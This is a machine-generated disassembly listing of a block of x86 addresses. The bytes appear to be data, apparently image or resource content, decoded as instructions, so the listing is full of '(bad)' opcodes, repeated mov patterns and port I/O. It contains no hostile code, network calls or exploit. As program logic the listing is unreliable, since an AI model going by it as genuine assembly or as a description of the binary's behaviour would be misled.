  40de24:	mov    edi,0xbfffb2b4
  40de29:	mov    ah,0xb2
  40de2b:	(bad)  
  40de2c:	mov    edi,0xbfffb2b4
  40de31:	mov    ah,0xb2
  40de33:	(bad)  
  40de34:	mov    edi,0xb9ffb2b4
  40de39:	popf   
  40de3a:	jg     0x40de3b
	...
  40de44:	popf   
  40de45:	data16 and al,0x56
  40de48:	fwait
  40de49:	gs and al,0xff
  40de4c:	into   
  40de4d:	mov    edi,0xeae6ffab
  40de52:	jmp    0xec2dc756
  40de57:	(bad)  
  40de58:	in     al,dx
  40de59:	out    dx,al
  40de5a:	out    dx,eax
  40de5b:	inc    eax
  40de5d:	loop   0x40de21
  40de5f:	push   DWORD PTR [edi-0x3a]
  40de62:	jns    0x40de63
  40de64:	xor    esp,DWORD PTR [esi-0x60d200ca]
  40de6a:	das    
  40de6b:	jmp    FWORD PTR [edi-0x43]
  40de6e:	jno    0x40de6f
  40de70:	ret    0xc2e2
  40de73:	(bad)  
  40de74:	std    
  40de75:	std    
  40de76:	std    
  40de77:	(bad)  
  40de78:	std    
  40de79:	std    
  40de7a:	std    
  40de7b:	(bad)  
  40de7c:	std    
  40de7d:	std    
  40de7e:	std    
  40de7f:	call   esi
  40de81:	enter  0xffb7,0x85
  40de85:	pop    eax
  40de86:	and    al,0xff
  40de88:	test   BYTE PTR [edi+0x24],dl
  40de8b:	push   esi
	...
  40de98:	xchg   edx,eax
  40de99:	ins    DWORD PTR es:[edi],dx
  40de9a:	inc    esp
  40de9b:	(bad)  
  40de9c:	(bad)  
  40de9d:	(bad)  
  40de9e:	(bad)  
  40de9f:	dec    DWORD PTR [edi-0x1f00c196]
  40dea5:	(bad)  
  40dea6:	int3   
  40dea7:	(bad)  
  40dea8:	mov    esi,0xbfffb0b3
  40dead:	mov    ah,0xb2
  40deaf:	(bad)  
  40deb0:	mov    edi,0xbfffb2b4
  40deb5:	mov    ah,0xb2
  40deb7:	(bad)  
  40deb8:	mov    edi,0xbfffb2b4
  40debd:	mov    ah,0xb2
  40debf:	(bad)  
  40dec0:	mov    edi,0xbfffb2b4
  40dec5:	mov    ah,0xb2
  40dec7:	(bad)  
  40dec8:	mov    edi,0xbfffb2b4
  40decd:	mov    ah,0xb2
  40decf:	(bad)  
  40ded0:	mov    edi,0xbfffb2b4
  40ded5:	mov    ah,0xb2
  40ded7:	(bad)  
  40ded8:	mov    edi,0xbfffb2b4
  40dedd:	mov    ah,0xb2
  40dedf:	(bad)  
  40dee0:	mov    edi,0xbfffb2b4
  40dee5:	mov    ah,0xb2
  40dee7:	(bad)  
  40dee8:	mov    edi,0xbfffb2b4
  40deed:	mov    ah,0xb2
  40deef:	(bad)  
  40def0:	mov    edi,0xbfffb2b4
  40def5:	mov    ah,0xb2
  40def7:	(bad)  
  40def8:	mov    ecx,0xff7f9d
  40defd:	add    BYTE PTR [eax],al
  40deff:	add    BYTE PTR [eax],al
  40df01:	add    BYTE PTR [eax],al
  40df03:	add    BYTE PTR [esi-0x4f68db9a],bl
  40df09:	mov    DWORD PTR [edx-0x1],ebx
  40df0c:	loop   0x40def2
  40df0e:	loop   0x40df0f
  40df10:	jecxz  0x40def9
  40df12:	out    0xff,eax
  40df14:	in     eax,0xe9
  40df16:	jmp    0xc424a11a
  40df1b:	jmp    DWORD PTR [ecx-0x36]
  40df1e:	push   DWORD PTR fs:[eax]
  40df21:	mov    ah,0x34
  40df23:	jmp    DWORD PTR [ebx]
  40df25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df26:	daa    
  40df27:	call   DWORD PTR [edi]
  40df29:	fwait
  40df2a:	sbb    edi,edi
  40df2c:	adc    BYTE PTR [edx-0x58c000ed],dl
  40df32:	inc    edx
  40df33:	inc    edx
  40df35:	loop   0x40def9
  40df37:	(bad)  
  40df38:	std    
  40df39:	std    
  40df3a:	std    
  40df3b:	(bad)  
  40df3c:	std    
  40df3d:	std    
  40df3e:	std    
  40df3f:	(bad)  
  40df40:	cli    
  40df41:	clc    
  40df42:	idiv   edi
  40df44:	lahf   
  40df45:	jg     0x40dfa1
  40df47:	inc    DWORD PTR [ebp+0x972457]
	...
  40df55:	add    BYTE PTR [eax],al
  40df57:	add    BYTE PTR [edx-0x6900ba93],dl
  40df5d:	jne    0x40dfae
  40df5f:	(bad)  
  40df60:	(bad)  
  40df62:	leave  
  40df63:	(bad)  
  40df64:	(bad)  
  40df65:	(bad)  
  40df66:	std    
  40df67:	(bad)  
  40df68:	mov    edi,0xbfffb2b4
  40df6d:	mov    ah,0xb2
  40df6f:	(bad)  
  40df70:	mov    edi,0xbfffb2b4
  40df75:	mov    ah,0xb2
  40df77:	(bad)  
  40df78:	mov    edi,0xbfffb2b4
  40df7d:	mov    ah,0xb2
  40df7f:	(bad)  
  40df80:	mov    edi,0xbfffb2b4
  40df85:	mov    ah,0xb2
  40df87:	(bad)  
  40df88:	mov    edi,0xbfffb2b4
  40df8d:	mov    ah,0xb2
  40df8f:	(bad)  
  40df90:	mov    edi,0xbfffb2b4
  40df95:	mov    ah,0xb2
  40df97:	(bad)  
  40df98:	mov    edi,0xbfffb2b4
  40df9d:	mov    ah,0xb2
  40df9f:	(bad)  
  40dfa0:	mov    edi,0xbfffb2b4
  40dfa5:	mov    ah,0xb2
  40dfa7:	(bad)  
  40dfa8:	mov    edi,0xbfffb2b4
  40dfad:	mov    ah,0xb2
  40dfaf:	(bad)  
  40dfb0:	mov    edi,0xbfffb2b4
  40dfb5:	mov    ah,0xb2
  40dfb7:	(bad)  
  40dfb8:	mov    ecx,0xff7f9d
  40dfbd:	add    BYTE PTR [eax],al
  40dfbf:	add    BYTE PTR [eax],al
  40dfc1:	add    BYTE PTR [eax],al
  40dfc3:	add    BYTE PTR [edi-0x4732db98],bl
  40dfc9:	cwde   
  40dfca:	outs   dx,DWORD PTR ds:[esi]
  40dfcb:	jmp    ebx
  40dfcd:	out    0xe7,eax
  40dfcf:	jmp    ebx
  40dfd1:	out    0xe7,eax
  40dfd3:	jmp    ebx
  40dfd5:	out    0xe7,eax
  40dfd7:	dec    DWORD PTR [ebp+ebx*8-0x32b60070]
  40dfde:	dec    ebp
  40dfdf:	(bad)  
  40dfe0:	ds ret 0xff42
  40dfe4:	xor    DWORD PTR [ebx-0x5adc00cc],esi
  40dfea:	call   FWORD PTR es:[eax]
  40dfed:	fwait
  40dfee:	sbb    edi,edi
  40dff0:	adc    BYTE PTR [edx-0x429000ed],dl
  40dff6:	jno    0x40dff7
  40dff8:	std    
  40dff9:	std    
  40dffa:	std    
  40dffb:	(bad)  
  40dffc:	std    
  40dffd:	std    
  40dffe:	std    
  40dfff:	(bad)  
  40e000:	std    
  40e001:	std    
  40e002:	std    
  40e003:	push   DWORD PTR [ebx-0x79007e65]
  40e009:	pop    eax
  40e00a:	and    al,0xcd
	...
  40e018:	xchg   edx,eax
  40e019:	ins    DWORD PTR es:[edi],dx
  40e01a:	inc    ebp
  40e01b:	push   DWORD PTR [esi-0x6008466]
  40e021:	div    ebp
  40e023:	(bad)  
  40e024:	(bad)  
  40e025:	(bad)  
  40e026:	(bad)  
  40e027:	(bad)  
  40e028:	mov    edi,0xbfffb2b4
  40e02d:	mov    ah,0xb2
  40e02f:	(bad)  
  40e030:	mov    edi,0xbfffb2b4
  40e035:	mov    ah,0xb2
  40e037:	(bad)  
  40e038:	mov    edi,0xbfffb2b4
  40e03d:	mov    ah,0xb2
  40e03f:	(bad)  
  40e040:	mov    edi,0xbfffb2b4
  40e045:	mov    ah,0xb2
  40e047:	(bad)  
  40e048:	mov    edi,0xbfffb2b4
  40e04d:	mov    ah,0xb2
  40e04f:	(bad)  
  40e050:	mov    edi,0xbfffb2b4
  40e055:	mov    ah,0xb2
  40e057:	(bad)  
  40e058:	mov    edi,0xbfffb2b4
  40e05d:	mov    ah,0xb2
  40e05f:	(bad)  
  40e060:	mov    edi,0xbfffb2b4
  40e065:	mov    ah,0xb2
  40e067:	(bad)  
  40e068:	mov    edi,0xbfffb2b4
  40e06d:	mov    ah,0xb2
  40e06f:	(bad)  
  40e070:	mov    edi,0xbfffb2b4
  40e075:	mov    ah,0xb2
  40e077:	(bad)  
  40e078:	mov    ecx,0xff7f9d
  40e07d:	add    BYTE PTR [eax],al
  40e07f:	add    BYTE PTR [eax],al
  40e081:	add    BYTE PTR [eax],al
  40e083:	add    BYTE PTR [eax-0x260edb98],ah
  40e089:	aam    0xcb
  40e08b:	jmp    ebx
  40e08d:	out    0xe7,eax
  40e08f:	jmp    ebx
  40e091:	out    0xe7,eax
  40e093:	jmp    ebx
  40e095:	out    0xe7,eax
  40e097:	jmp    DWORD PTR [ebx-0x29]
  40e09a:	call   DWORD PTR [bx+di-0x2b]
  40e09e:	push   ebp
  40e09f:	dec    DWORD PTR [ecx-0x33]
  40e0a2:	dec    ebp
  40e0a3:	(bad)  
  40e0a4:	rol    DWORD PTR ds:[edx-0x1],0x30
  40e0a9:	mov    ah,0x34
  40e0ab:	jmp    DWORD PTR [ebx]
  40e0ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0ae:	daa    
  40e0af:	call   FWORD PTR [eax]
  40e0b1:	call   0xff2f:0x9f2cff1b
  40e0b8:	std    
  40e0b9:	std    
  40e0ba:	std    
  40e0bb:	(bad)  
  40e0bc:	std    
  40e0bd:	std    
  40e0be:	std    
  40e0bf:	(bad)  
  40e0c0:	std    
  40e0c1:	std    
  40e0c2:	std    
  40e0c3:	call   edi
  40e0c5:	(bad)  
  40e0c6:	iret   
  40e0c7:	inc    DWORD PTR [edi+0xf12459]
	...
  40e0d5:	add    BYTE PTR [eax],al
  40e0d7:	add    BYTE PTR [ecx-0x46008063],bh
  40e0dd:	popf   
  40e0de:	jg     0x40e0df
  40e0e0:	(bad)  
  40e0e1:	(bad)  
  40e0e2:	(bad)  
  40e0e3:	(bad)  
  40e0e4:	(bad)  
  40e0e5:	(bad)  
  40e0e6:	(bad)  
  40e0e7:	(bad)  
  40e0e8:	mov    edi,0xbfffb2b4
  40e0ed:	mov    ah,0xb2
  40e0ef:	(bad)  
  40e0f0:	mov    edi,0xbfffb2b4
  40e0f5:	mov    ah,0xb2
  40e0f7:	(bad)  
  40e0f8:	mov    edi,0xbfffb2b4
  40e0fd:	mov    ah,0xb2
  40e0ff:	(bad)  
  40e100:	mov    edi,0xbfffb2b4
  40e105:	mov    ah,0xb2
  40e107:	(bad)  
  40e108:	mov    edi,0xbfffb2b4
  40e10d:	mov    ah,0xb2
  40e10f:	(bad)  
  40e110:	mov    edi,0xbfffb2b4
  40e115:	mov    ah,0xb2
  40e117:	(bad)  
  40e118:	mov    edi,0xbfffb2b4
  40e11d:	mov    ah,0xb2
  40e11f:	(bad)  
  40e120:	mov    edi,0xbfffb2b4
  40e125:	mov    ah,0xb2
  40e127:	(bad)  
  40e128:	mov    edi,0xbfffb2b4
  40e12d:	mov    ah,0xb2
  40e12f:	(bad)  
  40e130:	mov    edi,0xbfffb2b4
  40e135:	mov    ah,0xb2
  40e137:	(bad)  
  40e138:	mov    ecx,0xff7f9d
  40e13d:	add    BYTE PTR [eax],al
  40e13f:	add    BYTE PTR [eax],al
  40e141:	add    BYTE PTR [eax],al
  40e143:	add    BYTE PTR [ecx-0x2a0edb98],ah
  40e149:	int    0xc0
  40e14b:	jmp    ebx
  40e14d:	out    0xe7,eax
  40e14f:	jmp    ebx
  40e151:	out    0xe7,eax
  40e153:	jmp    ebx
  40e155:	out    0xe7,eax
  40e157:	jmp    DWORD PTR [ebx-0x29]
  40e15a:	call   DWORD PTR [bx+di-0x2b]
  40e15e:	push   ebp
  40e15f:	call   DWORD PTR [ecx-0x2b]
  40e162:	push   ebp
  40e163:	dec    DWORD PTR [ecx-0x33]
  40e166:	dec    ebp
  40e167:	(bad)  
  40e168:	rol    DWORD PTR ds:[edx-0x1],0x30
  40e16d:	mov    bl,0x34
  40e16f:	jmp    DWORD PTR [esi+eiz*4]
  40e172:	push   DWORD PTR es:[ebx]
  40e175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e176:	ss (bad) 
  40e178:	sti    
  40e179:	cld    
  40e17a:	sti    
  40e17b:	(bad)  
  40e17c:	std    
  40e17d:	std    
  40e17e:	std    
  40e17f:	(bad)  
  40e180:	std    
  40e181:	std    
  40e182:	std    
  40e183:	call   esi
  40e185:	ror    ebx,cl
  40e187:	dec    DWORD PTR [eax+0xf12459]
	...
  40e195:	add    BYTE PTR [eax],al
  40e197:	add    BYTE PTR [ecx-0x46008063],bh
  40e19d:	popf   
  40e19e:	jg     0x40e19f
  40e1a0:	(bad)  
  40e1a1:	(bad)  
  40e1a2:	(bad)  
  40e1a3:	(bad)  
  40e1a4:	(bad)  
  40e1a5:	(bad)  
  40e1a6:	(bad)  
  40e1a7:	(bad)  
  40e1a8:	mov    edi,0xbfffb2b4
  40e1ad:	mov    ah,0xb2
  40e1af:	(bad)  
  40e1b0:	mov    edi,0xbfffb2b4
  40e1b5:	mov    ah,0xb2
  40e1b7:	(bad)  
  40e1b8:	mov    edi,0xbfffb2b4
  40e1bd:	mov    ah,0xb2
  40e1bf:	(bad)  
  40e1c0:	mov    edi,0xbfffb2b4
  40e1c5:	mov    ah,0xb2
  40e1c7:	(bad)  
  40e1c8:	mov    edi,0xbfffb2b4
  40e1cd:	mov    ah,0xb2
  40e1cf:	(bad)  
  40e1d0:	mov    edi,0xbfffb2b4
  40e1d5:	mov    ah,0xb2
  40e1d7:	(bad)  
  40e1d8:	mov    edi,0xbfffb2b4
  40e1dd:	mov    ah,0xb2
  40e1df:	(bad)  
  40e1e0:	mov    edi,0xbfffb2b4
  40e1e5:	mov    ah,0xb2
  40e1e7:	(bad)  
  40e1e8:	mov    edi,0xbfffb2b4
  40e1ed:	mov    ah,0xb2
  40e1ef:	(bad)  
  40e1f0:	mov    edi,0xbfffb2b4
  40e1f5:	mov    ah,0xb2
  40e1f7:	(bad)  
  40e1f8:	mov    ecx,0xff7f9d
  40e1fd:	add    BYTE PTR [eax],al
  40e1ff:	add    BYTE PTR [eax],al
  40e201:	add    BYTE PTR [eax],al
  40e203:	add    BYTE PTR [edx-0x3f32db97],ah
  40e209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e20a:	cmp    edi,0xffe7e7e3
  40e210:	jecxz  0x40e1f9
  40e212:	out    0xff,eax
  40e214:	jecxz  0x40e1fd
  40e216:	out    0xff,eax
  40e218:	mov    ebx,esp
  40e21a:	(bad)  
  40e21b:	call   DWORD PTR [ecx-0x2b]
  40e21e:	push   ebp
  40e21f:	call   DWORD PTR [ecx-0x2b]
  40e222:	push   ebp
  40e223:	call   DWORD PTR [ecx-0x2b]
  40e226:	push   ebp
  40e227:	dec    DWORD PTR [ecx-0x33]
  40e22a:	dec    ebp
  40e22b:	(bad)  
  40e22c:	rol    DWORD PTR ds:[edx-0x1],0x30
  40e231:	mov    ah,0x34
  40e233:	push   DWORD PTR [edi-0x3a]
  40e236:	jns    0x40e237
  40e238:	idiv   eax
  40e23a:	stc    
  40e23b:	(bad)  
  40e23c:	sti    
  40e23d:	sti    
  40e23e:	sti    
  40e23f:	(bad)  
  40e240:	cld    
  40e241:	cld    
  40e242:	cld    
  40e243:	push   DWORD PTR [ebp-0x76007e62]
  40e249:	pop    edx
  40e24a:	and    al,0xcd
	...
  40e258:	mov    ecx,0xb9ff7f9d
  40e25d:	popf   
  40e25e:	jg     0x40e25f
  40e260:	(bad)  
  40e261:	(bad)  
  40e262:	(bad)  
  40e263:	(bad)  
  40e264:	(bad)  
  40e265:	(bad)  
  40e266:	(bad)  
  40e267:	(bad)  
  40e268:	mov    edi,0xbfffb2b4
  40e26d:	mov    ah,0xb2
  40e26f:	(bad)  
  40e270:	mov    edi,0xbfffb2b4
  40e275:	mov    ah,0xb2
  40e277:	(bad)  
  40e278:	mov    edi,0xbfffb2b4
  40e27d:	mov    ah,0xb2
  40e27f:	(bad)  
  40e280:	mov    edi,0xbfffb2b4
  40e285:	mov    ah,0xb2
  40e287:	(bad)  
  40e288:	mov    edi,0xbfffb2b4
  40e28d:	mov    ah,0xb2
  40e28f:	(bad)  
  40e290:	mov    edi,0xbfffb2b4
  40e295:	mov    ah,0xb2
  40e297:	(bad)  
  40e298:	mov    edi,0xbfffb2b4
  40e29d:	mov    ah,0xb2
  40e29f:	(bad)  
  40e2a0:	mov    edi,0xbfffb2b4
  40e2a5:	mov    ah,0xb2
  40e2a7:	(bad)  
  40e2a8:	mov    edi,0xbfffb2b4
  40e2ad:	mov    ah,0xb2
  40e2af:	(bad)  
  40e2b0:	mov    edi,0xbfffb2b4
  40e2b5:	mov    ah,0xb2
  40e2b7:	(bad)  
  40e2b8:	mov    ecx,0xff7f9d
  40e2bd:	add    BYTE PTR [eax],al
  40e2bf:	add    BYTE PTR [eax],al
  40e2c1:	add    BYTE PTR [eax],al
  40e2c3:	add    BYTE PTR [edx-0x4b68db97],ah
  40e2c9:	mov    WORD PTR [edx-0x1],ds
  40e2cc:	loope  0x40e2b2
  40e2ce:	loope  0x40e2cf
  40e2d0:	jecxz  0x40e2b9
  40e2d2:	out    0xff,eax
  40e2d4:	jecxz  0x40e2bd
  40e2d6:	out    0xff,eax
  40e2d8:	mov    esi,0x6effc2e2
  40e2dd:	fnstenv [edx-0x1]
  40e2e0:	push   ecx
  40e2e1:	aad    0x55
  40e2e3:	call   DWORD PTR [ecx-0x2b]
  40e2e6:	push   ebp
  40e2e7:	call   DWORD PTR [ecx-0x2b]
  40e2ea:	push   ebp
  40e2eb:	dec    DWORD PTR [ecx-0x33]
  40e2ee:	dec    ebp
  40e2ef:	jmp    DWORD PTR [eax-0x36]
  40e2f2:	fs inc eax
  40e2f5:	loop   0x40e2b9
  40e2f7:	push   esp
  40e2f9:	cmc    
  40e2fa:	idiv   bh
  40e2fc:	clc    
  40e2fd:	clc    
  40e2fe:	stc    
  40e2ff:	push   esi
  40e301:	cmc    
  40e302:	hlt    
  40e303:	jmp    DWORD PTR [ebx+eax*4+0x5b8aff5a]
  40e30a:	and    al,0x97
	...
  40e318:	mov    ecx,0xb9ff7f9d
  40e31d:	popf   
  40e31e:	jg     0x40e31f
  40e320:	(bad)  
  40e321:	(bad)  
  40e322:	(bad)  
  40e323:	(bad)  
  40e324:	(bad)  
  40e325:	(bad)  
  40e326:	(bad)  
  40e327:	(bad)  
  40e328:	mov    edi,0xbfffb2b4
  40e32d:	mov    ah,0xb2
  40e32f:	(bad)  
  40e330:	mov    edi,0xbfffb2b4
  40e335:	mov    ah,0xb2
  40e337:	(bad)  
  40e338:	mov    edi,0xbfffb2b4
  40e33d:	mov    ah,0xb2
  40e33f:	(bad)  
  40e340:	mov    edi,0xbfffb2b4
  40e345:	mov    ah,0xb2
  40e347:	(bad)  
  40e348:	mov    edi,0xbfffb2b4
  40e34d:	mov    ah,0xb2
  40e34f:	(bad)  
  40e350:	mov    edi,0xbfffb2b4
  40e355:	mov    ah,0xb2
  40e357:	(bad)  
  40e358:	mov    edi,0xbfffb2b4
  40e35d:	mov    ah,0xb2
  40e35f:	(bad)  
  40e360:	mov    edi,0xbfffb2b4
  40e365:	mov    ah,0xb2
  40e367:	(bad)  
  40e368:	mov    edi,0xbfffb2b4
  40e36d:	mov    ah,0xb2
  40e36f:	(bad)  
  40e370:	mov    edi,0xbfffb2b4
  40e375:	mov    ah,0xb2
  40e377:	(bad)  
  40e378:	mov    ecx,0xff7f9d
  40e37d:	add    BYTE PTR [eax],al
  40e37f:	add    BYTE PTR [eax],al
  40e381:	add    BYTE PTR [eax],al
  40e383:	add    BYTE PTR [edx-0x5da9db97],ah
  40e389:	imul   esp,DWORD PTR [edi+edi*8],0xffa9bece
  40e390:	jecxz  0x40e379
  40e392:	out    0xff,eax
  40e394:	jecxz  0x40e37d
  40e396:	out    0xff,eax
  40e398:	jecxz  0x40e381
  40e39a:	out    0xff,eax
  40e39c:	mov    esi,0x8bffc2e2
  40e3a1:	fmul   QWORD PTR [edi+0x67d763ff]
  40e3a7:	jmp    DWORD PTR [ebx-0x29]
  40e3aa:	dec    DWORD PTR [si-0x6f23]
  40e3af:	inc    eax
  40e3b1:	jecxz  0x40e376
  40e3b3:	(bad)  
  40e3b4:	in     al,dx
  40e3b5:	out    dx,al
  40e3b6:	out    dx,al
  40e3b7:	push   eax
  40e3b9:	repnz repnz push esp
  40e3bd:	cmc    
  40e3be:	idiv   bh
  40e3c0:	aam    0xc5
  40e3c2:	mov    bl,0xff
  40e3c4:	mov    ds,WORD PTR [ebp+0x24]
  40e3c7:	dec    DWORD PTR [ebp+0x56245c]
	...
  40e3d5:	add    BYTE PTR [eax],al
  40e3d7:	add    BYTE PTR [ecx-0x46008063],bh
  40e3dd:	popf   
  40e3de:	jg     0x40e3df
  40e3e0:	(bad)  
  40e3e1:	(bad)  
  40e3e2:	(bad)  
  40e3e3:	(bad)  
  40e3e4:	(bad)  
  40e3e5:	(bad)  
  40e3e6:	(bad)  
  40e3e7:	(bad)  
  40e3e8:	mov    edi,0xbfffb2b4
  40e3ed:	mov    ah,0xb2
  40e3ef:	(bad)  
  40e3f0:	mov    edi,0xbfffb2b4
  40e3f5:	mov    ah,0xb2
  40e3f7:	(bad)  
  40e3f8:	mov    edi,0xbfffb2b4
  40e3fd:	mov    ah,0xb2
  40e3ff:	(bad)  
  40e400:	mov    edi,0xbfffb2b4
  40e405:	mov    ah,0xb2
  40e407:	(bad)  
  40e408:	mov    edi,0xbfffb2b4
  40e40d:	mov    ah,0xb2
  40e40f:	(bad)  
  40e410:	mov    edi,0xbfffb2b4
  40e415:	mov    ah,0xb2
  40e417:	(bad)  
  40e418:	mov    edi,0xbfffb2b4
  40e41d:	mov    ah,0xb2
  40e41f:	(bad)  
  40e420:	mov    edi,0xbfffb2b4
  40e425:	mov    ah,0xb2
  40e427:	(bad)  
  40e428:	mov    edi,0xbfffb2b4
  40e42d:	mov    ah,0xb2
  40e42f:	(bad)  
  40e430:	mov    edi,0xbfffb2b4
  40e435:	mov    ah,0xb2
  40e437:	(bad)  
  40e438:	mov    ecx,0xff7f9d
  40e43d:	add    BYTE PTR [eax],al
  40e43f:	add    BYTE PTR [eax],al
  40e441:	add    BYTE PTR [eax],al
  40e443:	add    BYTE PTR [edx-0x5df5db97],ah
  40e449:	imul   esp,DWORD PTR [ebx+ebp*4],0xff2469a2
  40e450:	(bad)  
  40e452:	fcos   
  40e454:	jecxz  0x40e43d
  40e456:	out    0xff,eax
  40e458:	jecxz  0x40e441
  40e45a:	out    0xff,eax
  40e45c:	jecxz  0x40e445
  40e45e:	out    0xff,eax
  40e460:	jecxz  0x40e449
  40e462:	out    0xff,eax
  40e464:	jecxz  0x40e44d
  40e466:	out    0xff,eax
  40e468:	jecxz  0x40e451
  40e46a:	out    0xff,eax
  40e46c:	jecxz  0x40e455
  40e46e:	out    0xff,eax
  40e470:	in     eax,0xe9
  40e472:	call   0xec2dcd76
  40e477:	(bad)  
  40e478:	in     al,dx
  40e479:	out    dx,eax
  40e47a:	out    dx,eax
  40e47b:	(bad)  
  40e47c:	call   0x9240c767
  40e481:	pop    edi
  40e482:	and    al,0xff
  40e484:	(bad)  
  40e485:	pop    ebp
  40e486:	and    al,0xab
  40e488:	mov    ds,WORD PTR [ebp+0x24]
  40e48b:	or     al,BYTE PTR [eax]
	...
  40e495:	add    BYTE PTR [eax],al
  40e497:	add    BYTE PTR [ecx-0x46008063],bh
  40e49d:	popf   
  40e49e:	jg     0x40e49f
  40e4a0:	(bad)  
  40e4a1:	(bad)  
  40e4a2:	(bad)  
  40e4a3:	(bad)  
  40e4a4:	(bad)  
  40e4a5:	(bad)  
  40e4a6:	(bad)  
  40e4a7:	(bad)  
  40e4a8:	mov    edi,0xbfffb2b4
  40e4ad:	mov    ah,0xb2
  40e4af:	(bad)  
  40e4b0:	mov    edi,0xbfffb2b4
  40e4b5:	mov    ah,0xb2
  40e4b7:	(bad)  
  40e4b8:	mov    edi,0xbfffb2b4
  40e4bd:	mov    ah,0xb2
  40e4bf:	(bad)  
  40e4c0:	mov    edi,0xbfffb2b4
  40e4c5:	mov    ah,0xb2
  40e4c7:	(bad)  
  40e4c8:	mov    edi,0xbfffb2b4
  40e4cd:	mov    ah,0xb2
  40e4cf:	(bad)  
  40e4d0:	mov    edi,0xbfffb2b4
  40e4d5:	mov    ah,0xb2
  40e4d7:	(bad)  
  40e4d8:	mov    edi,0xbfffb2b4
  40e4dd:	mov    ah,0xb2
  40e4df:	(bad)  
  40e4e0:	mov    edi,0xbfffb2b4
  40e4e5:	mov    ah,0xb2
  40e4e7:	(bad)  
  40e4e8:	mov    edi,0xbfffb2b4
  40e4ed:	mov    ah,0xb2
  40e4ef:	(bad)  
  40e4f0:	mov    edi,0xbfffb2b4
  40e4f5:	mov    ah,0xb2
  40e4f7:	(bad)  
  40e4f8:	mov    ecx,0xff7f9d
	...
  40e505:	add    BYTE PTR [eax],al
  40e507:	add    BYTE PTR [edx-0x5dbadb97],ah
  40e50d:	imul   esp,DWORD PTR [edx*8-0xdb965e],0xffd9ddde
  40e518:	jecxz  0x40e501
  40e51a:	out    0xff,eax
  40e51c:	jecxz  0x40e505
  40e51e:	out    0xff,eax
  40e520:	jecxz  0x40e509
  40e522:	out    0xff,eax
  40e524:	jecxz  0x40e50d
  40e526:	out    0xff,eax
  40e528:	jecxz  0x40e511
  40e52a:	out    0xff,eax
  40e52c:	jecxz  0x40e515
  40e52e:	out    0xff,eax
  40e530:	jecxz  0x40e519
  40e532:	out    0xff,eax
  40e534:	out    0xea,al
  40e536:	jmp    0xde23ca3a
  40e53b:	call   DWORD PTR [ebp-0x6c00db9f]
  40e541:	pusha  
  40e542:	and    al,0xd5
  40e544:	xchg   ecx,eax
  40e545:	pop    edi
  40e546:	and    al,0x45
	...
  40e558:	mov    ecx,0xb9ff7f9d
  40e55d:	popf   
  40e55e:	jg     0x40e55f
  40e560:	(bad)  
  40e561:	(bad)  
  40e562:	(bad)  
  40e563:	(bad)  
  40e564:	(bad)  
  40e565:	(bad)  
  40e566:	(bad)  
  40e567:	(bad)  
  40e568:	(bad)  
  40e569:	(bad)  
  40e56a:	(bad)  
  40e56b:	(bad)  
  40e56c:	(bad)  
  40e56d:	(bad)  
  40e56e:	(bad)  
  40e56f:	(bad)  
  40e570:	(bad)  
  40e571:	(bad)  
  40e572:	(bad)  
  40e573:	(bad)  
  40e574:	(bad)  
  40e575:	(bad)  
  40e576:	(bad)  
  40e577:	(bad)  
  40e578:	(bad)  
  40e579:	(bad)  
  40e57a:	(bad)  
  40e57b:	(bad)  
  40e57c:	(bad)  
  40e57d:	(bad)  
  40e57e:	(bad)  
  40e57f:	(bad)  
  40e580:	(bad)  
  40e581:	(bad)  
  40e582:	(bad)  
  40e583:	(bad)  
  40e584:	(bad)  
  40e585:	(bad)  
  40e586:	(bad)  
  40e587:	(bad)  
  40e588:	(bad)  
  40e589:	(bad)  
  40e58a:	(bad)  
  40e58b:	(bad)  
  40e58c:	(bad)  
  40e58d:	(bad)  
  40e58e:	(bad)  
  40e58f:	(bad)  
  40e590:	(bad)  
  40e591:	(bad)  
  40e592:	(bad)  
  40e593:	(bad)  
  40e594:	(bad)  
  40e595:	(bad)  
  40e596:	(bad)  
  40e597:	(bad)  
  40e598:	(bad)  
  40e599:	(bad)  
  40e59a:	(bad)  
  40e59b:	(bad)  
  40e59c:	(bad)  
  40e59d:	(bad)  
  40e59e:	(bad)  
  40e59f:	(bad)  
  40e5a0:	(bad)  
  40e5a1:	(bad)  
  40e5a2:	(bad)  
  40e5a3:	(bad)  
  40e5a4:	(bad)  
  40e5a5:	(bad)  
  40e5a6:	(bad)  
  40e5a7:	(bad)  
  40e5a8:	(bad)  
  40e5a9:	(bad)  
  40e5aa:	(bad)  
  40e5ab:	(bad)  
  40e5ac:	(bad)  
  40e5ad:	(bad)  
  40e5ae:	(bad)  
  40e5af:	(bad)  
  40e5b0:	(bad)  
  40e5b1:	(bad)  
  40e5b2:	(bad)  
  40e5b3:	(bad)  
  40e5b4:	(bad)  
  40e5b5:	(bad)  
  40e5b6:	(bad)  
  40e5b7:	(bad)  
  40e5b8:	mov    ecx,0xff7f9d
	...
  40e5c9:	add    BYTE PTR [eax],al
  40e5cb:	add    BYTE PTR [edx-0x5da6db97],ah
  40e5d1:	imul   esp,DWORD PTR [edx*8-0xdb965e],0xffa9bece
  40e5dc:	loope  0x40e5c2
  40e5de:	loope  0x40e5df
  40e5e0:	jecxz  0x40e5c9
  40e5e2:	out    0xff,eax
  40e5e4:	jecxz  0x40e5cd
  40e5e6:	out    0xff,eax
  40e5e8:	jecxz  0x40e5d1
  40e5ea:	out    0xff,eax
  40e5ec:	jecxz  0x40e5d5
  40e5ee:	out    0xff,eax
  40e5f0:	loop   0x40e5d6
  40e5f2:	loop   0x40e5f3
  40e5f4:	into   
  40e5f5:	mov    edi,0x6398ffaa
  40e5fa:	and    al,0xff
  40e5fc:	xchg   esi,eax
  40e5fd:	bound  esp,QWORD PTR [edx*8+0x59246194]
	...
  40e618:	mov    ecx,0xb9ff7f9d
  40e61d:	popf   
  40e61e:	jg     0x40e61f
  40e620:	(bad)  
  40e621:	(bad)  
  40e622:	(bad)  
  40e623:	(bad)  
  40e624:	(bad)  
  40e625:	(bad)  
  40e626:	(bad)  
  40e627:	(bad)  
  40e628:	(bad)  
  40e629:	(bad)  
  40e62a:	(bad)  
  40e62b:	(bad)  
  40e62c:	(bad)  
  40e62d:	(bad)  
  40e62e:	(bad)  
  40e62f:	(bad)  
  40e630:	(bad)  
  40e631:	(bad)  
  40e632:	(bad)  
  40e633:	(bad)  
  40e634:	(bad)  
  40e635:	(bad)  
  40e636:	(bad)  
  40e637:	(bad)  
  40e638:	(bad)  
